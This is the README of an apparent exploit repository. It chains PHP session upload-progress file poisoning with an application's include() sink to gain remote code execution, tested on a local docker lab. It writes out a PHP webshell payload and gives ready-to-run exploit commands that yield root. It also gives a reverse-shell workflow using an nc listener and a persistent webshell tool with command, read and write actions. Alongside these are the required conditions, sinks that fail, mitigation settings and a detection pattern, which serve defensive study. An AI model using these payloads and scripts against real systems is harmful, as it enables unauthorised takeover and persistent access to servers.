# PHP session poisoning → RCE

**Session-file poisoning to LFI to RCE** on current PHP (**8.5.11**, tested).
No CVE — this is an **application flaw**, not a PHP core bug.

![PHP](https://img.shields.io/badge/PHP-8.5.11-777bb4)
![Status](https://img.shields.io/badge/status-confirmed%20(conditional)-success)
![License](https://img.shields.io/badge/license-MIT-blue)

---

## The bug in one picture

```
POST /upload   field: PHP_SESSION_UPLOAD_PROGRESS = "<?php system($_GET['c']);?>"
       |
       v
/tmp/sess_<sid>  contains:  upload_progress_<?php system($_GET['c']);?>|a:5:{...}
       |
       v
include($_GET['tpl'])   ← the application's own LFI sink
       |
       v
uid=0(root)
```

PHP writes the **field name** into the session file as a key. If the field
name is PHP code, that code executes when the app `include()`s the file.

---

## Requirements

All six must hold. **Three are not default.**

| # | Condition | Default? |
|---|---|---|
| 1 | `session.upload_progress.enabled = On` | ✅ yes |
| 2 | `session.upload_progress.cleanup = Off` | ❌ **no** |
| 3 | `session.save_path` known | ✅ `/tmp` |
| 4 | Attacker knows/controls the session ID | ✅ cookie |
| 5 | **`include()` on a user-controlled path** | ❌ **no** |
| 6 | Sink does **not** append an extension | ❌ **no** |

Condition 2 is the usual blocker: with `cleanup = On` PHP deletes the
session file at the end of the request. We polled every 10 ms for 300
rounds — the file never exists with content.

---

## Quick start

```bash
# 1. run the lab
docker build -t p2s-lab lab/
docker run -d --name p2s -p 8088:8088 -v "$PWD/lab:/app:ro" t p2s-lab

# 2. exploit
python3 scripts/exploit_generic.py 127.0.0.1 8088 /view.php tpl
```

Expected:

```
[2] include  -> HTTP 200
[+] RCE      : TAK
    uid=0(root) gid=0(root) groups=0(root)
```

---

## Sinks that work

Tested, all `uid=0` on PHP 8.5.11:

| Sink pattern | Param | Real-world equivalent |
|---|---|---|
| `include($_GET['tpl'])` | `tpl` | plain PHP |
| `include($_REQUEST['template'])` | `template` | CWE-98 in WP plugins |
| `include($path)` after `file_exists()` | `view` | Laravel `View::file()` |

`file_exists()` **does not protect** — the session file exists.

```bash
python3 scripts/exploit_generic.py <host> <port> /lab.php view          # Laravel pattern
python3 scripts/exploit_generic.py <host> <port> /lab_standalone.php template   # WP plugin pattern
```

## Sinks that do NOT work

| Sink | Why |
|---|---|
| `include($x . '.php')` | session file has no `.php` |
| `require basename($x . '.php')` | `basename()` strips traversal |
| `wptravelengine_get_template("content-{$m}.php")` | appends `.php` |

Verified against **real WP Travel Engine 6.6.7** (CVE-2025-7634) — see
[`docs/REAL-PLUGIN-RESULT.md`](docs/REAL-PLUGIN-RESULT.md). The chain was
broken through to `{"success":true}` but the `.php` suffix blocks the payload.

---

## Shell, not just `id`

**Reverse shell** — interactive, `root@host#`:

```bash
# terminal 1 - listener
nc -lvp 4444
# terminal 2 - exploit
python3 shell/reverse_shell.py <target-ip> <your-ip> 4444 /view.php tpl 8088
```

**Persistent webshell** — survives client restarts, no outbound port needed:

```bash
python3 webshell/session_webshell.py <target> <port> /view.php tpl
# -> prints SID; reuse it without re-poisoning:
python3 webshell/session_webshell.py <target> <port> /view.php tpl <SID>
```

Webshell actions: `persist`, `info`, `ls`, `cmd`, `read`, `write`.

| | Reverse shell | Webshell |
|---|---|---|
| Lifetime | until TCP closes | **until the file is deleted** |
| Needs listener | yes | **no** |
| Needs outbound port | yes | **no** |
| HTTP-only | no | **yes** |

---

## What was measured and does NOT work

Nine alternative vectors, each blocked for a concrete reason:

| Attempt | Blocked by |
|---|---|
| race with `cleanup=On` | file never created with content |
| SID containing `.php` | PHP validates the session id |
| `data://` | `allow_url_include=Off` |
| `php://input` via `include` | `allow_url_include=Off` |
| `/proc/self/fd` | body lives in memory, not a descriptor |
| `phar://` deserialization | phar must start at byte 0; session has a prefix |
| `error_log` poisoning | PHP HTML-encodes the payload |
| `basename()` sink | reduces path to a filename |

Full detail: [`docs/VERDICT.md`](docs/VERDICT.md) ·
[`docs/SINKS-MATRIX.md`](docs/SINKS-MATRIX.md)

> Interesting side finding: `allow_url_include` blocks **only**
> `include`/`require`. `file_get_contents('php://filter/.../php://input')`
> still works. With `allow_url_include=On`, `php://input` gives RCE with
> **no file at all** — but that directive is `Off` by default and
> deprecated in PHP 8.

---

## Mitigation

```ini
session.upload_progress.enabled = Off
```

That kills the primitive outright. If upload progress is required, set
`session.upload_progress.cleanup = On` and, above all, **fix the
`include()` sink** — that is the actual vulnerability.

Detection: anomalous multipart POSTs whose `PHP_SESSION_UPLOAD_PROGRESS`
value contains `<?php`, followed by requests including a path under
`session.save_path`.

---

## Watch it work

[`demo/php2shell-demo.mp4`](demo/php2shell-demo.mp4) — 60 s, 1920x1080.

The terminal segment is an **unmodified asciinema recording** (source in
[`demo/asciinema.cast`](demo/asciinema.cast)): the lab is built, the multipart request
is poisoned, the session file is dumped showing the payload as a key, the command runs
as `uid=0(root)`, and a reverse shell lands as `root@<container>:/app#`.

It is evidence, not a re-enactment.

## Repository layout

```
README.md
demo/
  php2shell-demo.mp4    60s walkthrough with the real capture
  asciinema.cast        the raw recording
lab/                    vulnerable app (cleanup=Off)
lab-strong/             same, without the wrapper guard
sinks/laravel/          View::file() pattern
sinks/wordpress-plugin/ CWE-98 pattern
scripts/
  exploit_generic.py    universal: host, port, path, param
  pwn.py                original CASE-004 chain
shell/
  reverse_shell.py      interactive shell (params: target, lhost, lport, path, param, tport)
webshell/
  session_webshell.py   install + persistent webshell CLI
docs/
  VERDICT.md            full verdict, 9 measured dead ends
  SINKS-MATRIX.md       which sink patterns accept the session file
  REAL-PLUGIN-RESULT.md test against real WP Travel Engine 6.6.7
  SINK-RESEARCH.md      research over public PHP code
```

---

## Scope and honesty

This is **not universal RCE**. It is an **LFI amplifier** that works on a
narrow class of applications: those that `include()` a user-controlled
path **without appending an extension**, with `cleanup=Off`.

In public code the pattern `include($x . '.php')` dominates, which is why
this technique has a small real-world surface. We searched 178k CVE
entries, GitHub code search, and seven WordPress plugins — see
[`docs/SINK-RESEARCH.md`](docs/SINK-RESEARCH.md).

Value here is the **measured boundary**: a working, repeatable exploit plus
a documented map of what blocks it and why.

## License

MIT — for authorised testing and lab use only.
